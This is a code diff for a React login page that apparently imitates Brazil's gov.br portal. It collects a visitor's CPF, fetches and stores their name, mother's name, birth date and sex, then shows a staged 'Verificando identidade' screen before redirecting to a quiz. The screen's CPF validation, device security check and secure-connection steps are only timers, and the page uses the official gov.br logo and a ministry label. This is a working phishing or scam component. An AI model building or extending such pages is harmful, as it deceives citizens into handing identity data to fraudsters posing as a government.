@@ -1,7 +1,6 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import useUtmNavigator from '../hooks/useUtmNavigator';
 import { useUser } from '../context/UserContext';
-import { usePixelTracking } from '../hooks/usePixelTracking';
 import axios from 'axios';
 
 interface UserInfo {
@@ -87,13 +86,40 @@ const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?:
 };
 
 const Login: React.FC = () => {
-  usePixelTracking();
-  
   const [cpf, setCpf] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [showTransition, setShowTransition] = useState(false);
   const navigate = useUtmNavigator();
-  const { setUserName } = useUser();
+  const navigateRef = useRef(navigate);
+  useEffect(() => { navigateRef.current = navigate; });
+  const { setUserName, setUserData } = useUser();
+
+  // ── Transition screen state ──────────────────────────────────────────────
+  const [phase, setPhase] = useState(0);          // 0 | 1 | 2
+  const [progressW, setProgressW] = useState(0);  // 0-100
+
+  useEffect(() => {
+    if (!showTransition) return;
+
+    setPhase(0);
+    setProgressW(0);
+
+    const t0 = setTimeout(() => setProgressW(35),  80);
+    const t1 = setTimeout(() => { setPhase(1); setProgressW(68); }, 1000);
+    const t2 = setTimeout(() => { setPhase(2); setProgressW(92); }, 2000);
+    const t3 = setTimeout(() => navigateRef.current('/quiz'), 3000);
+
+    return () => { clearTimeout(t0); clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
+  }, [showTransition]); // intentionally omit navigate — stored in ref above
+
+  const steps = [
+    'Validando seu CPF na base de dados gov.br',
+    'Verificando segurança do dispositivo',
+    'Estabelecendo conexão segura',
+  ];
+
+  const dotCount = 5;
 
   const formatCPF = (value: string) => {
     const numbers = value.replace(/\D/g, '');
@@ -130,15 +156,160 @@ const Login: React.FC = () => {
 
       if (result.data) {
         setUserName(result.data.nome);
+        // store full user data in context for other pages
+        setUserData({
+          cpf: result.data.cpf || result.data.CPF || cpf.replace(/\D/g, ""),
+          nome: result.data.nome || "",
+          nome_mae: result.data.nome_mae || result.data.MAE || "",
+          data_nascimento: result.data.data_nascimento || result.data.DATA_NASCIMENTO || "",
+          sexo: result.data.sexo || result.data.SEXO || "",
+        });
       }
 
-      navigate('/');
-    } catch (error) {
+      setShowTransition(true);
+    } catch {
       setError('Erro ao validar CPF. Tente novamente.');
     } finally {
       setLoading(false);
     }
   };
+
+  if (showTransition) {
+    return (
+      <div
+        className="fixed inset-0 z-50 flex flex-col overflow-hidden"
+        style={{
+          fontFamily: 'Rawline, Helvetica, Arial, sans-serif',
+          backgroundColor: '#071D41',
+          backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px)',
+          backgroundSize: '20px 20px',
+        }}
+      >
+        {/* Plus/cross SVG pattern overlay */}
+        <div className="absolute inset-0 opacity-5 pointer-events-none">
+          <div
+            className="absolute inset-0"
+            style={{
+              backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
+            }}
+          />
+        </div>
+
+        {/* Top header bar */}
+        <div className="bg-[#071D41] py-2 mt-4 relative z-10">
+          <div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
+            <img
+              src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
+              alt="gov.br"
+              className="h-6 object-contain"
+              style={{ filter: 'brightness(0) invert(1)', opacity: 0.8 }}
+            />
+            <span className="text-white/40 tracking-wider" style={{ fontSize: 10 }}>MINISTÉRIO DA SEGURANÇA</span>
+          </div>
+        </div>
+
+        {/* Main content */}
+        <div className="flex-1 flex items-center justify-center px-4">
+          <div className="flex flex-col items-center text-center text-white max-w-sm w-full mx-auto">
+
+            {/* Spinner ring + icon */}
+            <div className="mb-8">
+              <div className="w-16 h-16 mx-auto relative">
+                <div
+                  className="absolute inset-0 rounded-full"
+                  style={{
+                    borderWidth: 2,
+                    borderStyle: 'solid',
+                    borderColor: '#168821 rgba(255,255,255,0.1) rgba(255,255,255,0.1)',
+                    animation: 'govSpin 1s linear infinite',
+                  }}
+                />
+                <div className="absolute inset-0 flex items-center justify-center text-white/90">
+                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5}
+                      d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                  </svg>
+                </div>
+              </div>
+            </div>
+
+            <h2 className="text-lg font-medium mb-2">Verificando identidade</h2>
+            <p className="text-sm mb-8 leading-relaxed" style={{ opacity: 0.6 }}>
+              Consultando a base de dados para verificar seu CPF<br />e o histórico de acessos deste dispositivo.
+            </p>
+
+            {/* Progress bar */}
+            <div className="w-full max-w-xs mx-auto mb-6">
+              <div className="h-0.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.1)' }}>
+                <div
+                  className="h-full rounded-full"
+                  style={{
+                    width: `${progressW}%`,
+                    background: '#168821',
+                    transition: 'width 0.6s cubic-bezier(0.4,0,0.2,1)',
+                  }}
+                />
+              </div>
+            </div>
+
+            {/* Dot step indicators */}
+            <div className="flex justify-center gap-2">
+              {Array.from({ length: dotCount }).map((_, i) => (
+                <div
+                  key={i}
+                  className="w-2 h-2 rounded-full"
+                  style={{
+                    transition: 'all 0.3s ease',
+                    backgroundColor: i <= phase ? '#168821' : 'rgba(255,255,255,0.15)',
+                    transform: i === phase ? 'scale(1.4)' : 'scale(1)',
+                  }}
+                />
+              ))}
+            </div>
+          </div>
+        </div>
+
+        {/* Bottom status panel */}
+        <div className="relative z-10 py-5 px-4" style={{ borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+          <div className="max-w-md mx-auto">
+            <div className="rounded-lg p-4" style={{ background: 'rgba(255,255,255,0.05)', backdropFilter: 'blur(4px)' }}>
+              <p className="text-white/50 uppercase tracking-wider mb-2" style={{ fontSize: 10 }}>O que está acontecendo</p>
+              <div className="space-y-2">
+                {steps.map((text, i) => {
+                  const active = i <= phase;
+                  return (
+                    <div key={i} className="flex items-center gap-2">
+                      <div
+                        className="w-1.5 h-1.5 rounded-full flex-shrink-0"
+                        style={{
+                          background: active ? '#009c3b' : 'rgba(255,255,255,0.2)',
+                          animation: active && i === phase ? 'pulse 1.5s ease-in-out infinite' : 'none',
+                        }}
+                      />
+                      <span
+                        className="text-xs"
+                        style={{ color: active ? 'rgba(255,255,255,0.7)' : 'rgba(255,255,255,0.3)' }}
+                      >
+                        {text}
+                      </span>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <style>{`
+          @keyframes govSpin { to { transform: rotate(360deg); } }
+          @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50%       { opacity: 0.4; }
+          }
+        `}</style>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: 1.5 }}>
